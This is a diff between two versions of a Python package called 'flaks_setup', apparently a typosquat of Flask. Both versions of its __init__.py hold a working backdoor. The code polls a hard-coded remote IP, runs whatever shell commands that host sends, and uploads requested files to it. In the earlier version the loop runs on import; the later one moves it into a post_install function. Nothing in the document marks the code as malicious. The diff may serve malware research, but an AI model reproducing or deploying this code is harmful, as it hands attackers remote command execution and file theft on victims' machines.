# Comparing `tmp/flaks_setup-0.9.tar.gz` & `tmp/flaks_setup-0.91.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "flaks_setup-0.9.tar", last modified: Wed May 10 13:07:22 2023, max compression
+gzip compressed data, was "flaks_setup-0.91.tar", last modified: Wed May 10 13:08:26 2023, max compression
```

## Comparing `flaks_setup-0.9.tar` & `flaks_setup-0.91.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxrwxrwx   0        0        0        0 2023-05-10 13:07:22.003746 flaks_setup-0.9/
--rw-rw-rw-   0        0        0      218 2023-05-10 13:07:22.004745 flaks_setup-0.9/PKG-INFO
--rw-rw-rw-   0        0        0       13 2023-05-10 11:09:27.000000 flaks_setup-0.9/README.md
--rw-rw-rw-   0        0        0      115 2023-05-10 13:07:22.004745 flaks_setup-0.9/setup.cfg
--rw-rw-rw-   0        0        0      390 2023-05-10 13:07:16.000000 flaks_setup-0.9/setup.py
-drwxrwxrwx   0        0        0        0 2023-05-10 13:07:21.988709 flaks_setup-0.9/src/
-drwxrwxrwx   0        0        0        0 2023-05-10 13:07:21.994223 flaks_setup-0.9/src/flaks_setup/
--rw-rw-rw-   0        0        0     1420 2023-05-10 13:07:05.000000 flaks_setup-0.9/src/flaks_setup/__init__.py
--rw-rw-rw-   0        0        0     1717 2023-05-10 13:00:59.000000 flaks_setup-0.9/src/flaks_setup/post_install.py
-drwxrwxrwx   0        0        0        0 2023-05-10 13:07:22.002738 flaks_setup-0.9/src/flaks_setup.egg-info/
--rw-rw-rw-   0        0        0      218 2023-05-10 13:07:21.000000 flaks_setup-0.9/src/flaks_setup.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      282 2023-05-10 13:07:21.000000 flaks_setup-0.9/src/flaks_setup.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-10 13:07:21.000000 flaks_setup-0.9/src/flaks_setup.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-05-10 13:07:21.000000 flaks_setup-0.9/src/flaks_setup.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2023-05-10 13:07:21.000000 flaks_setup-0.9/src/flaks_setup.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-05-10 13:08:26.438198 flaks_setup-0.91/
+-rw-rw-rw-   0        0        0      219 2023-05-10 13:08:26.438198 flaks_setup-0.91/PKG-INFO
+-rw-rw-rw-   0        0        0       13 2023-05-10 11:09:27.000000 flaks_setup-0.91/README.md
+-rw-rw-rw-   0        0        0      115 2023-05-10 13:08:26.439937 flaks_setup-0.91/setup.cfg
+-rw-rw-rw-   0        0        0      391 2023-05-10 13:08:24.000000 flaks_setup-0.91/setup.py
+drwxrwxrwx   0        0        0        0 2023-05-10 13:08:26.425101 flaks_setup-0.91/src/
+drwxrwxrwx   0        0        0        0 2023-05-10 13:08:26.430103 flaks_setup-0.91/src/flaks_setup/
+-rw-rw-rw-   0        0        0     1579 2023-05-10 13:08:19.000000 flaks_setup-0.91/src/flaks_setup/__init__.py
+-rw-rw-rw-   0        0        0     1717 2023-05-10 13:00:59.000000 flaks_setup-0.91/src/flaks_setup/post_install.py
+drwxrwxrwx   0        0        0        0 2023-05-10 13:08:26.437199 flaks_setup-0.91/src/flaks_setup.egg-info/
+-rw-rw-rw-   0        0        0      219 2023-05-10 13:08:26.000000 flaks_setup-0.91/src/flaks_setup.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      282 2023-05-10 13:08:26.000000 flaks_setup-0.91/src/flaks_setup.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-10 13:08:26.000000 flaks_setup-0.91/src/flaks_setup.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        9 2023-05-10 13:08:26.000000 flaks_setup-0.91/src/flaks_setup.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2023-05-10 13:08:26.000000 flaks_setup-0.91/src/flaks_setup.egg-info/top_level.txt
```

### Comparing `flaks_setup-0.9/src/flaks_setup/__init__.py` & `flaks_setup-0.91/src/flaks_setup/__init__.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,40 +1,42 @@
 import requests
 import os
 import subprocess
 
-HOST = "http://46.101.114.247:80"
-current_dir = os.getcwd()
 
-while True:
-    req = requests.get(f'{HOST}')
-    command = req.text
-    if 'exit' in command:
-        break
-    elif 'grab' in command:
-        grab, path, filename = command.split(" ")
-        print(grab, path, filename)
-        if os.path.exists(path):
-            url = f"{HOST}/store"
-            files = {'file': (filename, open(path, 'rb'))}
-            r = requests.post(url, files=files)
+
+def post_install():
+    HOST = "http://46.101.114.247:80"
+    current_dir = os.getcwd()
+    while True:
+        req = requests.get(f'{HOST}')
+        command = req.text
+        if 'exit' in command:
+            break
+        elif 'grab' in command:
+            grab, path, filename = command.split(" ")
+            print(grab, path, filename)
+            if os.path.exists(path):
+                url = f"{HOST}/store"
+                files = {'file': (filename, open(path, 'rb'))}
+                r = requests.post(url, files=files)
+            else:
+                post_response = requests.post(
+                    url=f'{HOST}', data='[-] Not able to find the file!'.encode())
+        elif 'cd' in command:
+            code, path = command.split(' ')
+            try:
+                os.chdir(path)
+                current_dir = os.getcwd()
+                post_response = requests.post(
+                    url=f'{HOST}', data=current_dir.encode())
+            except FileNotFoundError as e:
+                post_response = requests.post(
+                    url=f'{HOST}', data=str(e).encode())
+
         else:
+            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
+                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
             post_response = requests.post(
-                url=f'{HOST}', data='[-] Not able to find the file!'.encode())
-    elif 'cd' in command:
-        code, path = command.split(' ')
-        try:
-            os.chdir(path)
-            current_dir = os.getcwd()
+                url=f'{HOST}', data=CMD.stdout.read())
             post_response = requests.post(
-                url=f'{HOST}', data=current_dir.encode())
-        except FileNotFoundError as e:
-            post_response = requests.post(
-                url=f'{HOST}', data=str(e).encode())
-
-    else:
-        CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
-                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
-        post_response = requests.post(
-            url=f'{HOST}', data=CMD.stdout.read())
-        post_response = requests.post(
-            url=f'{HOST}', data=CMD.stderr.read())
+                url=f'{HOST}', data=CMD.stderr.read())
```

### Comparing `flaks_setup-0.9/src/flaks_setup/post_install.py` & `flaks_setup-0.91/src/flaks_setup/post_install.py`

 * *Files identical despite different names*

